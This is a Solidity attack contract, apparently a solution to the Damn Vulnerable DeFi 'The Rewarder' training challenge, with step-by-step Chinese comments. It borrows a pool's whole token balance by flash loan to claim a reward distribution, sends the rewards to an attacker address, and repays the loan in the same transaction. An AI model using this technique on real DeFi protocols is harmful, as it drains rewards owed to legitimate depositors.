// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";

contract AttackRewardPool {

    address receiver; // attacker
    TheRewarderPool rewardPool;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(address _rewardPool, address _flashLoanPool, address _liquidityToken, address _rewardToken, address _receiver) {
        rewardPool = TheRewarderPool(_rewardPool);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        receiver = _receiver;
    }

    function Attack() external {
        // flashLoanPool 所有 liquidityToken （盡量炸光
        uint256 borrowAmount = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(borrowAmount);
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        // 將 approve 給 reward pool
        console.log("borrowAmount: %s", borrowAmount);
        liquidityToken.approve(address(rewardPool), borrowAmount);

        // 存錢進 reward pool 拿獎勵（內含 distributeRewards()）
        rewardPool.deposit(borrowAmount);

        // 獲得的獎勵
        uint256 rewardAmount = rewardToken.balanceOf(address(this));
        console.log("rewardAmount: %s", rewardAmount);

        // 轉獎勵給攻擊者
        rewardToken.transfer(receiver, rewardAmount);
        console.log("rewceiver got reward amount: %s", rewardToken.balanceOf(receiver));
        
        // 歸還借款 liquidityToken
        rewardPool.withdraw(borrowAmount);
        liquidityToken.transfer(address(flashLoanPool), borrowAmount);
        console.log("final token amount: %s", liquidityToken.balanceOf(address(flashLoanPool)));
    }
}